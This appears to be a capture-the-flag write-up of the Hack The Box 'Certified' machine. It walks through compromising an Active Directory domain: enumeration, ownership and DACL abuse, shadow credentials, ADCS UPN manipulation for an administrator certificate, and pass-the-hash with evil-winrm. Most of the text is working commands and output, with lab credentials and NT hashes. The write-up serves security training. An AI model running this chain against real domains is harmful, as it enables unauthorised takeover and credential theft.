---
title: HTB Certified
date: 2024-11-15 08:50:00 +/-TTTT
categories: [Hackthebox, Windows]
tags: [adcs, writeowner]     # TAG names should always be lowercase
description: 

image:
  path: assets/certified/cropped-box-certified.png
---
---

### Introduction
**Certified** is an HTB machine simulating an AD environment with ADCS. Key ports point to a domain controller. With valid creds, users can enumerate SMB shares and accounts. The attack chain abuses ADCS via the `management_svc` account using tools like BloodHound and `pywhisker` to add a KeyCredential. A forged certificate is used with PKINIT to get a TGT and escalate to domain admin.

---
### Nmap Scan
```python
nmap -sV -sC 10.10.11.41        

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 12:34 UTC
Nmap scan report for 10.10.11.41
Host is up (0.015s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-13 19:34:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-13T19:36:13+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-13T19:36:13+00:00; +7h00m00s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2024-11-13T19:36:13+00:00; +7h00m00s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-11-13T19:36:13+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2024-11-13T19:35:33
|_  start_date: N/A
```
> findings:
> since we start this machine with credentials, the only interesting ports are smb 445 + ldap + rpc

### Fullport scan
```sh
nmap -p- 10.10.11.41 --min-rate 1000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 12:45 UTC
Nmap scan report for 10.10.11.41
Host is up (0.015s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49686/tcp open  unknown
49705/tcp open  unknown
49727/tcp open  unknown
49762/tcp open  unknown
```


---
### Port 445
Since I got credentials I checked the SMB shares to see if there are any interesting files:
```sh
nxc smb 10.10.11.41 -u users.txt -p pass.txt --shares

SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share 
```
Theres no account lockout threshold so i can spray freely:
```sh
nxc smb 10.10.11.41 -u users.txt -p pass.txt --pass-pol

SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             [+] Dumping password info for domain: CERTIFIED
SMB         10.10.11.41     445    DC01             Minimum password length: 7
SMB         10.10.11.41     445    DC01             Password history length: 24
SMB         10.10.11.41     445    DC01             Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.11.41     445    DC01             
SMB         10.10.11.41     445    DC01             Password Complexity Flags: 000000
SMB         10.10.11.41     445    DC01                 Domain Refuse Password Change: 0
SMB         10.10.11.41     445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.11.41     445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.11.41     445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.11.41     445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.11.41     445    DC01                 Domain Password Complex: 0
SMB         10.10.11.41     445    DC01             
SMB         10.10.11.41     445    DC01             Minimum password age: 1 day 4 minutes 
SMB         10.10.11.41     445    DC01             Reset Account Lockout Counter: 10 minutes 
SMB         10.10.11.41     445    DC01             Locked Account Duration: 10 minutes 
SMB         10.10.11.41     445    DC01             Account Lockout Threshold: None
SMB         10.10.11.41     445    DC01             Forced Log off Time: Not Set
```

Next up I will enumerate domain users with the --users tag:
```sh
nxc smb 10.10.11.41 -u users.txt -p pass.txt --users 

SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09 
SMB         10.10.11.41     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.11.41     445    DC01             Administrator                 2024-05-13 14:53:16 0       Built-in account for administering the computer/domain
SMB         10.10.11.41     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.41     445    DC01             krbtgt                        2024-05-13 15:02:51 0       Key Distribution Center Service Account
SMB         10.10.11.41     445    DC01             judith.mader                  2024-05-14 19:22:11 0        
SMB         10.10.11.41     445    DC01             management_svc                2024-05-13 15:30:51 0        
SMB         10.10.11.41     445    DC01             ca_operator                   2024-05-13 15:32:03 0        
SMB         10.10.11.41     445    DC01             alexander.huges               2024-05-14 16:39:08 0        
SMB         10.10.11.41     445    DC01             harry.wilson                  2024-05-14 16:39:37 0        
SMB         10.10.11.41     445    DC01             gregory.cameron               2024-05-14 16:40:05 0 
```

I need to extract the users from this output, i will do this as follows:
```sh
cat raw_users | awk -F' ' {' print $5 '} | tail -n +4

Administrator
Guest
krbtgt
judith.mader
management_svc
ca_operator
alexander.huges
harry.wilson
gregory.cameron
```

---
### LDAP

#### ADCS enumeration
```sh
nxc ldap 10.10.11.41 -u judith.mader -p 'judith09' -M adcs                                                                             
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09 
ADCS        10.10.11.41     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.41     389    DC01             Found PKI Enrollment Server: DC01.certified.htb
ADCS        10.10.11.41     389    DC01             Found CN: certified-DC01-CA
```
Found certificate authority `certified-DC01-CA` 

---
#### Bloodhound scan with netexec
I could not find anything to enumerate with netexec, but i managed to run a bloodhound scan on here:
```sh
nxc ldap 10.10.11.41 -u judith.mader -p 'judith09' --kdcHost dc01.certified.htb --dns-server 10.10.11.41 --bloodhound --collection All

nxc ldap 10.10.11.236 -u operator -p operator --kdcHost dc01.certified.htb --dns-server 10.10.11.41 --bloodhound --collection All
```
![[Pasted image 20241113174414.png]]

![[Pasted image 20241113174433.png]]

---
#### Exploitation bloodhound
To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).
```sh
owneredit.py 'certified.htb'/'judith.mader':'judith09' -action write -new-owner 'judith.mader' -target 'management' 

/root/.local/bin/owneredit.py:87: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/root/.local/bin/owneredit.py:96: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
<snip>
</snip>
/root/.local/bin/owneredit.py:113: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!

```

**Modifying the rights:**
To abuse ownership of a group object, you may grant yourself the AddMember privilege.
Impacket's dacledit can be used for that purpose (cf. "grant rights" reference for the link).
```sh
dacledit.py certified.htb/judith.mader:judith09 -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB'


[*] DACL backed up to dacledit-20241114-000702.bak
[*] DACL modified successfully!
```
This allows me to add new members to the group. I will do this using the bloodyAD framework tool.
(https://github.com/CravateRouge/bloodyAD)
I struggeled a long time to get this syntax to work, but i finally got it: 
```sh
python3 bloodyAD.py --host 10.10.11.41 -u judith.mader -p judith09 -d certified.htb add groupMember Management judith.mader

[+] judith.mader added to Management
```
The next step is to confirm that this actually worked:
```sh
./bloodyAD.py --host 10.10.11.41 -u judith.mader -p judith09 -d certified.htb get membership judith.mader
```

----
Got stuck for long as I needed to copy the code from the older commits `ec30ba5759d57ead54341f58289090a9dc01249a`

Syncronizing my system time with the target servers time to not have issues with Kerberos authentication
```sh
ntpdate 10.10.11.41
```

Execute pywhisker to add a keycredential:
```sh
./pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target management_svc --action add 
```

Create a virtual environment and install the requirements with pip.
```sh
┌──(env)─(root㉿hacker)-[/opt/windows/pywhisker/pywhisker]
└─# ./lol.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action add 

[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 0f9161d5-e17a-c0f4-6ce1-1011ac5f142f
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: emgEYkWL.pfx
[*] Must be used with password: FW2Y8xbop7yZeFyRSLNw
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

Obtain a TGT using PKINIT and the generated certificate: 
```sh
./gettgtpkinit.py certified.htb/management_svc -cert-pfx ../pywhisker/pywhisker/emgEYkWL.pfx -pfx-pass "FW2Y8xbop7yZeFyRSLNw" joemomma.ccache 

2024-11-16 02:20:16,270 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2024-11-16 02:20:16,302 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2024-11-16 02:20:39,383 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2024-11-16 02:20:39,383 minikerberos INFO     7741d9dff9f249f4ff1560ba70bd29582fe4b67474cb0268b651e36dd8c2672f
INFO:minikerberos:7741d9dff9f249f4ff1560ba70bd29582fe4b67474cb0268b651e36dd8c2672f
2024-11-16 02:20:39,388 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```


**Extract the NT hash from the TGT**
Make sure you export the `.ccache` file into the `KRB4CCNAME` Linux variable
```sh
┌──(root㉿hacker)-[/opt/windows/PKINITtools]
└─# ./getnthash.py certified.htb/management_svc -key 7741d9dff9f249f4ff1560ba70bd29582fe4b67474cb0268b651e36dd8c2672f
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[-] No TGT found from ccache, did you set the KRB5CCNAME environment variable?
[-] Cannot convert NoneType to a seekable bit stream.
                                                                                                                         
┌──(root㉿hacker)-[/opt/windows/PKINITtools]
└─# ll                                                                                                                
total 76
-rw-r--r-- 1 root root  1095 Nov 16 01:43 LICENSE
-rw-r--r-- 1 root root  6412 Nov 16 01:43 README.md
-rw-r--r-- 1 root root  3286 Nov 16 01:52 dacledit-20241116-015241.bak
-rw-r--r-- 1 root root  3286 Nov 16 02:34 dacledit-20241116-023449.bak
drwxr-xr-x 6 root root  4096 Nov 16 01:45 env
-rwxr-xr-x 1 root root 10960 Nov 16 01:43 getnthash.py
-rwxr-xr-x 1 root root  8560 Nov 16 01:43 gets4uticket.py
-rwxr-xr-x 1 root root 14826 Nov 16 01:43 gettgtpkinit.py
-rw-r--r-- 1 root root  1721 Nov 16 02:20 joemomma.ccache
drwxr-xr-x 2 root root  4096 Nov 16 01:43 ntlmrelayx
-rw-r--r-- 1 root root    78 Nov 16 01:45 requirements.txt
                                                                                                                         
┌──(root㉿hacker)-[/opt/windows/PKINITtools]
└─# export KRB5CCNAME=joemomma.ccache 
                                                                                                                         
┌──(root㉿hacker)-[/opt/windows/PKINITtools]
└─# ./getnthash.py certified.htb/management_svc -key 7741d9dff9f249f4ff1560ba70bd29582fe4b67474cb0268b651e36dd8c2672f 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
/opt/windows/PKINITtools/./getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/opt/windows/PKINITtools/./getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting ticket to self with PAC

Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```
As you can see in the very bottom the NT hash has been extracted.


---
### Initial access
```sh
evil-winrm -u management_svc  -H'a091c1832bcdd4677c28b5a6a1295584'  -i 10.10.11.41
```


---
#### Continue the bloodhound path for PE with Certipy
https://github.com/ly4k/Certipy
Do shadow credentials attack with certipy:
```sh
certipy-ad shadow auto -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -account ca_operator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '9aff90ca-b9f5-4dcc-74bb-9171515c51c7'
[*] Adding Key Credential with device ID '9aff90ca-b9f5-4dcc-74bb-9171515c51c7' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '9aff90ca-b9f5-4dcc-74bb-9171515c51c7' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Using principal: ca_operator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
```
Here it captured the NT hash for `ca_operator`

**Update user properties with new credentials**:
```sh
certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn administrator

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'

```

Request and obtain a certificate for Administrator access:
```sh
ntpdate 10.10.11.41

2024-11-16 03:38:19.983032 (+0000) -0.027504 +/- 0.008153 10.10.11.41 s1 no-leap
                                                                                                                         
┌──(root㉿hacker)-[/opt/windows/PKINITtools]
└─# certipy-ad req -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error: The NETBIOS connection with the remote host timed out.
[-] Use -debug to print a stacktrace
                                                                                                                         
┌──(root㉿hacker)-[/opt/windows/PKINITtools]
└─# ntpdate pool.ntp.org
2024-11-15 20:39:26.554204 (+0000) -25200.026485 +/- 0.015251 pool.ntp.org 167.99.42.106 s2 no-leap
CLOCK: time stepped by -25200.026485
                                                                                                                         
┌──(root㉿hacker)-[/opt/windows/PKINITtools]
└─# certipy-ad req -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 5
[*] Got certificate with UPN 'ca_operator@certified.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'ca_operator.pfx'
```

```sh
certipy-ad account update -u management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'

```

Request the admin.pfx with certipy:
```sh
certipy-ad req -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication     
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

```

Authenticate as the domain administrator using the admin.pfx:
```sh
certipy-ad auth -pfx administrator.pfx -domain certified.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certified.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

---
### Root flag
```sh
evil-winrm -u administrator  -H'0d5b49608bbce1751f708748f67e2d34'  -i 10.10.11.41
```
